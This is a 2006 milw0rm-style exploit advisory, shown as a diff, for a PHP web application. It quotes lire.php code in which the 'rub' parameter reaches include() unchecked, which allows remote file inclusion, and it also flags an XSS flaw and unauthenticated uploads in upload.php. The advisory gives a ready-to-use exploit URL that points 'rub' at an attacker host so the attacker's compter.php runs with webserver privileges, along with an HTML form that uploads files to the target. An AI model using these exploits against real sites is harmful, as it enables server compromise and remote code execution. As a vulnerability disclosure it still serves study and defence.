@@ -1,0 +1,39 @@
+[+]File Inclusion:
+       Input passed to the "rub" parameter in "lire.php" isn't properly verified,
+       before it is used to include remote files
+       Successful exploitation requires that "register_globals" is enabled.
+
+[lire.php code]
+<?
+       73              if(empty($_GET["rub"])){$rub=rtrim($rubriques[0]);} else {$rub=$_GET["rub"];}
+       75              include($rub."/compter.php"); ## File Inclusion !!
+
+       298             echo $rub; ## XSS
+?>
+
+[+]Exploit: Exploit http://[trajet]/lire.php?rub=http://[attacker]&cahier=1&art=1
+[+]http://[attacker]/compter.php Will be Included And Executed withe the privilege of the webserver
+
+
+File Upload
+Remote User can Upload jpg,jpeg,gif,bmp files without Identification ,
+[upload.php code:]
+<?
+if( isset($_POST['upload']) ) // si formulaire soumis
+{
+#Upload code ....
+}
+?>
+Exploit :
+
+<form enctype="multipart/form-data" method="post" action="http://Trajet/upload.php?">
+Download File<br>
+<input name="fichier" type="file" size="48"><br>
+<input type="submit" name="upload" value="uploader"><form>
+
+[Moroccan Security Team]
+
+contact:
+simo64[at]gmail[dot]com
+
+# milw0rm.com [2006-04-09]
